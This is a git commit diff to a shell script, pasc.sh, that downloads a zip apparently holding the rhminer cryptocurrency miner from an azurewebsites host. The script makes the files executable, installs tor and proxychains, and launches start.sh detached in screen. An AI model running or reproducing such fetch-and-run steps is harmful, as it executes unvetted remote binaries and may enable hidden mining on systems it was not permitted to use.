a43fbeafe2105f6008f877c49716b8f68957c9f2
slicommeo <46085992+slicommeo@users.noreply.github.com>
2019-06-07 22:45:59 +0700

    Update pasc.sh

--- pasc.sh
+++ pasc.sh
@@ -1,13 +1,14 @@
 #!/bin/bash
 sudo apt update
 sudo apt -y install apt-transport-https screen unzip
-wget "http://addmail.azurewebsites.net/rhminer.zip" 
-unzip rhminer.zip
-cd rhminer
+wget "http://addmail.azurewebsites.net/pascv2.zip" 
+unzip pascv2.zip
+cd pascv2
 chmod +x rhminer
+chmod +x start.sh
 wget -q -O - https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | sudo apt-key add -
 echo "deb https://deb.torproject.org/torproject.org $(lsb_release -cs) main" | sudo tee -a /etc/apt/sources.list
 sudo apt update
 sudo apt  -y install tor deb.torproject.org-keyring
 sudo apt-get -y install proxychains
-
+screen -d -m ./start.sh
